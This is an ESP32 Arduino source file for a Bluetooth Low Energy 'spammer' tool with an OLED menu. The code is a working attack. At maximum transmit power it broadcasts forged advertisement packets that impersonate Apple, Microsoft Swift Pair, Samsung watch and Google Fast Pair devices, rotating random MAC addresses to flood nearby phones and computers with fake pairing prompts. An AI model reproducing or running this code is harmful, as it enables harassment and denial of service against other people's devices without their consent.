#include "ble_spammer_devices.h"
#include "apple_logo.h"
#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <esp_arduino_version.h>
#include <Adafruit_SSD1306.h>

// Bluetooth maximum transmit power
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
#define MAX_TX_POWER ESP_PWR_LVL_P20  // ESP32H2 ESP32C6
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9  // Default
#endif

// External variables
extern Adafruit_SSD1306 oled;
extern GButton ok;

BLEAdvertising* pAdvertising;  // Global variable
uint32_t delayMilliseconds = 900;
bool ble_app_run_exit = false;  // Flag for menu exit

// Variables for non-blocking timing
unsigned long previousMillis = 0;
bool advertising = false;

// Device mode for advertisement
uint8_t deviceMode = 0;  // 0 = Random, 1 = Microsoft, 2 = Samsung, 3 = Google

const char* generateRandomName() {
  const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  int len = rand() % 10 + 1;                                   // Генерація випадкової довжини від 1 до 10
  char* randomName = (char*)malloc((len + 1) * sizeof(char));  // Виділення пам'яті для випадкового імені

  int noise = analogRead(15);  // Зчитування шуму з аналогового входу (A0)
  int noiseInfluence = noise % 10; // Отримання значення від 0 до 9 з шуму

  for (int i = 0; i < len; ++i) {
    randomName[i] = charset[(rand() + noiseInfluence) % strlen(charset)];  // Вибір випадкових символів з набору символів
  }
  randomName[len] = '\0';  // Завершення рядка
  return randomName;
}


int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));
uint8_t currentSymbol[32];

void ble_spammer_with_display() {
  ble_app_run_exit = false;

  String randomBluetoothName = generateRandomName();
  BLEDevice::init(randomBluetoothName.c_str());
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
  BLEServer* pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  esp_bd_addr_t null_addr = { 0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69 };
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);

  while (!ble_app_run_exit) {
    ok.tick();

    if (advertising) {
      memcpy(currentSymbol, run_spam, sizeof(run_spam));  // Копируем массив крестика
    } else {
      memcpy(currentSymbol, off_spam, sizeof(off_spam));  // Копируем массив галочки
    }


    unsigned long currentMillis = millis();

    if (currentMillis - previousMillis >= delayMilliseconds) {
      previousMillis = currentMillis;

      if (advertising) {
        pAdvertising->stop();
        advertising = false;
      } else {
        esp_bd_addr_t dummy_addr = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
        for (int i = 0; i < 6; i++) {
          dummy_addr[i] = random(256);
          if (i == 0) dummy_addr[i] |= 0xF0;
        }

        BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
        switch (deviceMode) {
          case 0:  // Random advertisement type
            {
              int device_choice = random(2);
              if (device_choice == 0) {
                int index = random(17);
                oAdvertisementData.addData(String((char*)DEVICES[index], 31));
              } else {
                int index = random(13);
                oAdvertisementData.addData(String((char*)SHORT_DEVICES[index], 23));
              }
              break;
            }
          case 1:  // Microsoft
            {
              const char* Name = generateRandomName();  // Ensure this function is defined
              uint8_t name_len = strlen(Name);
              uint8_t AdvData_Raw[7 + name_len];
              uint8_t i = 0;
              AdvData_Raw[i++] = 7 + name_len - 1;
              AdvData_Raw[i++] = 0xFF;
              AdvData_Raw[i++] = 0x06;
              AdvData_Raw[i++] = 0x00;
              AdvData_Raw[i++] = 0x03;
              AdvData_Raw[i++] = 0x00;
              AdvData_Raw[i++] = 0x80;
              memcpy(&AdvData_Raw[i], Name, name_len);
              i += name_len;

              oAdvertisementData.addData(String((char*)AdvData_Raw, 7 + name_len));
              break;
            }
          case 2:  // Samsung
            {
              uint8_t model = watch_models[random(26)].value;  // Ensure watch_models is defined
              uint8_t Samsung_Data[15] = { 0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, (model >> 0x00) & 0xFF };
              oAdvertisementData.addData(String((char*)Samsung_Data, 15));
              break;
            }
          case 3:  // Google
            {
              const uint32_t model = android_models[rand() % android_models_count].value;  // Action Type
              uint8_t Google_Data[14] = {
                0x03, 0x03, 0x2C, 0xFE,                                                                          //First 3 data to announce Fast Pair
                0x06, 0x16, 0x2C, 0xFE, (model >> 0x10) & 0xFF, (model >> 0x08) & 0xFF, (model >> 0x00) & 0xFF,  // 6 more data to inform FastPair and device data
                0x02, 0x0A, (rand() % 120) - 100
              };  // 2 more data to inform RSSI data.
              oAdvertisementData.addData(String((char*)Google_Data, 14));
              break;
            }
          default:
            Serial.println("Please Provide a Company Type");
            break;
        }

        int adv_type_choice = random(3);
        if (adv_type_choice == 0) {
          pAdvertising->setAdvertisementType(ADV_TYPE_IND);
        } else if (adv_type_choice == 1) {
          pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
        } else {
          pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
        }

        pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
        pAdvertising->setAdvertisementData(oAdvertisementData);
        pAdvertising->setMinInterval(0x20);
        pAdvertising->setMaxInterval(0x20);
        pAdvertising->setMinPreferred(0x20);
        pAdvertising->setMaxPreferred(0x20);
        pAdvertising->start();
        advertising = true;

        // Update OLED display
      }
      oled.clearDisplay();
      oled.setCursor(0, 0);
      oled.drawBitmap(0, 18, dedsec, 128, 46, 1);
      oled.setTextSize(2);

      int x_pos = 128 - 8 - 32;  // Позиция X
      int y_pos = 0;             // Позиция Y (верхний край)

      switch (deviceMode) {
        case 0:
          oled.print("Apple");
          oled.drawBitmap(x_pos, y_pos, currentSymbol, 16, 16, 1);
          oled.drawBitmap(128 - 24, 0, deauth, 24, 24, 1);
          break;
        case 1:
          oled.print("Windows");
          oled.drawBitmap(x_pos, y_pos, currentSymbol, 16, 16, 1);
          oled.drawBitmap(128 - 24, 0, deauth, 24, 24, 1);
          break;
        case 2:
          oled.print("Samsung");
          oled.drawBitmap(x_pos, y_pos, currentSymbol, 16, 16, 1);
          oled.drawBitmap(128 - 24, 0, deauth, 24, 24, 1);
          break;
        case 3:
          oled.print("Google");
          oled.drawBitmap(x_pos, y_pos, currentSymbol, 16, 16, 1);
          oled.drawBitmap(128 - 24, 0, deauth, 24, 24, 1);
          break;
      }
      oled.display();
    }

    if (ok.isClick()) {
      deviceMode++;
      if (deviceMode > 3) deviceMode = 0;  // Adjusted to match new case count
    }

    if (ok.isHolded()) {
      oled.setTextSize(1);
      ble_app_run_exit = true;
    }
  }
}
